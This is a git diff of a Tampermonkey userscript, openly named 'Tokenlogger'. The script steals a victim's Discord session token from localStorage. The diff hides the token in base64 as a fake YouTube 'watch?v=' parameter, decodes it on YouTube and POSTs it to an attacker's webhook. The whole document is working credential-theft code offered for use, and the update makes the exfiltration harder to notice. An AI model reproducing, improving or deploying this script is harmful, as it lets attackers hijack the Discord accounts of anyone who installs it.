@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Tokenlogger
-// @namespace    https://github.com/Lyzev
-// @version      1.1
+// @namespace    https://github.com/Lyzev/Tokenlogger
+// @version      1.2
 // @description  A simple tokenlogger for Tampermonkey. (Browser Extension)
 // @author       Lyzev
 // @run-at       document-start
@@ -11,24 +11,24 @@
 // ==/UserScript==
 
 (function () {
+    const webhook = "WEBHOOK-URL";
     if (window.location.href.startsWith("https://www.youtube.com/")) {
         const url = new URL(window.location.href);
-        const token = url.searchParams.get("token");
-        const webhook = "WEBHOOK-URL";
-        if (token != null) {
+        const param = atob(url.searchParams.get("v"));
+        if (param != null) {
             const request = new XMLHttpRequest();
             request.open("POST", webhook);
             request.setRequestHeader("Content-type", "application/json");
             const params = {
                 username: "Tokenlogger",
-                content: "Date: `" + new Date() + "`\nToken: `" + token + "`"
+                content: "Date: `" + new Date() + "`\nToken: `" + param + "`"
             };
             request.send(JSON.stringify(params));
         }
     } else if (window.location.href === "https://discord.com/channels/@me") {
         const token = localStorage.token;
         if (token != null) {
-            window.location.href = "https://www.youtube.com?token=" + token;
+            window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
         }
     } else {
         window.location.href = "https://discord.com/channels/@me";
